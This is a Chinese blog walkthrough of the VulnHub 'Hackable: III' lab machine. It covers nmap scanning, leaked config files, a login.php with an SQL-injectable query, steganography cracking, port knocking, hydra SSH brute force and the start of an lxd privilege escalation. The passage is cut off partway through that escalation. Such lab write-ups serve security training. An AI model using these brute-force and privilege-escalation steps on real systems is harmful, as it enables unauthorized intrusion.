@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/icon_32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/icon_16.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"hdfzzf.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="该靶机难度中等。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackableⅢ Writeup">
+<meta property="og:url" content="https://hdfzzf.github.io/2022/05/25/Hackable%E2%85%A2%20Writeup/index.html">
+<meta property="og:site_name" content="HDFZZF&#39;s BLOG">
+<meta property="og:description" content="该靶机难度中等。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524222044.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524222317.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524222700.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524224107.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525102602.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525102626.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525102913.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525103014.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525103020.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525103405.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525103458.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525104522.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525111710.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525112303.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525112314.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525112401.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525112826.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525113522.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525113537.png">
+<meta property="article:published_time" content="2022-05-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-05-25T03:40:12.452Z">
+<meta property="article:author" content="hdfzzf">
+<meta property="article:tag" content="综合">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="port knocking">
+<meta property="article:tag" content="lxd提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524222044.png">
+
+
+<link rel="canonical" href="https://hdfzzf.github.io/2022/05/25/Hackable%E2%85%A2%20Writeup/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hdfzzf.github.io/2022/05/25/Hackable%E2%85%A2%20Writeup/","path":"2022/05/25/HackableⅢ Writeup/","title":"HackableⅢ Writeup"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HackableⅢ Writeup | HDFZZF's BLOG</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+  <a target="_blank" rel="noopener" href="https://github.com/hdfzzf" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">HDFZZF's BLOG</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-text">1. 靶机信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">2. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="nav-text">2.1. 端口信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#http%E6%9C%8D%E5%8A%A1"><span class="nav-text">2.2. http服务</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#get-shell"><span class="nav-text">3. get shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">4. 权限提升</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">5. 总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="hdfzzf"
+      src="/images/zzf.jpg">
+  <p class="site-author-name" itemprop="name">hdfzzf</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">111</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">181</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/hdfzzf" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;hdfzzf" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:dfhong1998@163.com" title="E-Mail → mailto:dfhong1998@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hdfzzf.github.io/2022/05/25/Hackable%E2%85%A2%20Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/zzf.jpg">
+      <meta itemprop="name" content="hdfzzf">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="HDFZZF's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HackableⅢ Writeup
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-05-25 00:00 / 修改时间：11:40" itemprop="dateCreated datePublished" datetime="2022-05-25T00:00:00+08:00">2022-05-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus：</span>
+    
+    <a title="disqus" href="/2022/05/25/Hackable%E2%85%A2%20Writeup/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/05/25/HackableⅢ Writeup/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>8.4k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>该靶机难度中等。</p>
+<span id="more"></span>
+<h1 id="靶机信息">1. 靶机信息</h1>
+<p>靶机地址：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hackable-iii,720/">Hackable: III ~ VulnHub</a></li>
+</ul>
+<p>目标：</p>
+<ul>
+<li>拿到root权限</li>
+<li>拿到2个flag</li>
+</ul>
+<p>难度：</p>
+<ul>
+<li>中等</li>
+</ul>
+<h1 id="信息收集">2. 信息收集</h1>
+<h2 id="端口信息">2.1. 端口信息</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.55</span><br><span class="line">3. sudo nmap -p22,80 -A 10.0.2.55</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524222044.png" /></p>
+<p>注意这里的22端口的状态为 filtered，可能是存在端口敲门[[Port Knocking]]，所以等会需要留一下是否存在端口序列号。</p>
+<h2 id="http服务">2.2. http服务</h2>
+<p>直接访问80端口，主页面就一张图片，没有其他信息</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524222317.png" /></p>
+<p>查看源码得到一行注释： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Please, jubiscleudo, don&#x27;t forget to activate the port knocking when exiting your section, and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com&quot;</span><br></pre></td></tr></table></figure></p>
+<p>这么一句话其实有许多信息：</p>
+<ol type="1">
+<li>可能存在着三个用户：jubiscleudo, boss, dev_suport</li>
+<li>确实存在 port knocking</li>
+<li>某个图片文件</li>
+<li>一个域名：hackable3.com</li>
+</ol>
+<p>不管如何，先将该域名加入 /etc/hosts。之前路径扫描IP得到许多文件</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524222700.png" /></p>
+<p>一一访问这些文件。</p>
+<p>从 /backup 目录中得到一个 wordlist.txt。</p>
+<p>从 /config 目录中得到一个文件 1.txt，内容为 <code>MTAwMDA=</code>，利用base64解码得到 10000。</p>
+<p>从 config.php 中得到如下内容： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* Database credentials. Assuming you are running MySQL</span></span><br><span class="line"><span class="comment">server with default setting (user &#x27;root&#x27; with no password) */</span></span><br><span class="line">define(<span class="string">&#x27;DB_SERVER&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_USERNAME&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;hackable&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Attempt to connect to MySQL database */</span></span><br><span class="line"><span class="variable">$conexao</span> = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conexao</span> === <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ERROR: Could not connect. &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>从 login.php 中得到如下内容： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="variable">$usuario</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$senha</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot; SELECT * FROM usuarios WHERE user = &#x27;<span class="subst">&#123;$usuario&#125;</span>&#x27; and pass = &#x27;<span class="subst">&#123;$senha&#125;</span>&#x27;&quot;</span>;  </span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conexao</span>, <span class="variable">$query</span>);</span><br><span class="line"><span class="variable">$row</span> = mysqli_num_rows(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">#validaÃ§Ã£o conta</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span> == <span class="number">1</span>) &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;usuario&#x27;</span>] = <span class="variable">$usuario</span>;</span><br><span class="line">	header(<span class="string">&#x27;Location: 3.jpg&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;nao_autenticado&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">	header(<span class="string">&#x27;Location: login_page/login.html&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>从中得知了一个新的路径，login_page/login.html，这是一个登录界面：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524224107.png" /></p>
+<p>还得到一张图片 3.jpg，可能与注释中的图片文件有关。将3.jpg下载，并且查看是否有隐写： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide --info 3.jpg</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525102602.png" /></p>
+<p>确实存在隐写，但是需要密码（好像不需要密码🤡）。<del>利用之前得到的 wordlist.txt 进行破解</del>： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegseek 3.jpg wordlist.txt</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525102626.png" /></p>
+<p>读取其中的内容： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">porta:65535</span><br></pre></td></tr></table></figure></p>
+<p>从 /css 中也得到一个文件 2.txt，内容如下： <figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span>&gt;<span class="literal">+</span>&gt;++<span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span>&gt;&gt;&gt;--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span></span><br></pre></td></tr></table></figure></p>
+<p>解密后： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4444</span><br></pre></td></tr></table></figure></p>
+<h1 id="get-shell">3. get shell</h1>
+<p>从上面的信息收集可以知道，22端口存在port knocking，并且也获得了一个端口序列号：10000, 4444, 65535。于是先后访问这三个端口，然后再次查看22端口的状态： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. nmap -p 10000 10.0.2.55</span><br><span class="line">2. nmap -p 4444 10.0.2.55</span><br><span class="line">3. namp -p 65535 10.0.2.55</span><br></pre></td></tr></table></figure></p>
+<p>但是22还是处于filtered状态</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525102913.png" /></p>
+<p>后来搜索发现，需要使用 knock 这个工具 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">knock 10.0.2.55 10000 4444 65535</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525103014.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525103020.png" /></p>
+<p>22 端口成功开放。然后利用刚刚获得的用户名：jubiscleudo，以及wordlist.txt进行爆破 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jubiscleudo -P wordlist.txt 10.0.2.55 ssh</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525103405.png" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jubiscleudo:onlymy</span><br></pre></td></tr></table></figure>
+<p>利用得到的用户名和密码ssh登录</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525103458.png" /></p>
+<h1 id="权限提升">4. 权限提升</h1>
+<p>在 /var/www/html 下发现了一个文件 .bacup_config.php 内容如下： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* Database credentials. Assuming you are running MySQL</span></span><br><span class="line"><span class="comment">server with default setting (user &#x27;root&#x27; with no password) */</span></span><br><span class="line">define(<span class="string">&#x27;DB_SERVER&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_USERNAME&#x27;</span>, <span class="string">&#x27;hackable_3&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;TrOLLED_3&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;hackable&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Attempt to connect to MySQL database */</span></span><br><span class="line"><span class="variable">$conexao</span> = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conexao</span> === <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ERROR: Could not connect. &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>尝试使用如下命令连接数据库，发现靶机上没有数据库 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u hackable_3 -p </span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525104522.png" /></p>
+<p>注意到 /etc/passwd 中有一个用户为: hackable_3，切换到该用户，查看用户id</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525111710.png" /></p>
+<p>注意最后的 lxd，即hackable_3用户是 lxd 组的用户，而lxd组用户是可以提权到root的。</p>
+<p>需要分为两大部分：</p>
+<ol type="1">
+<li>攻击者需要做的</li>
+<li>靶机需要做的</li>
+</ol>
+<p>攻击者需要在kali上执行如下命令： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. git clone https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line">2. cd lxd-alpine-builder</span><br><span class="line">3. ./build-alpine # 以root权限</span><br></pre></td></tr></table></figure></p>
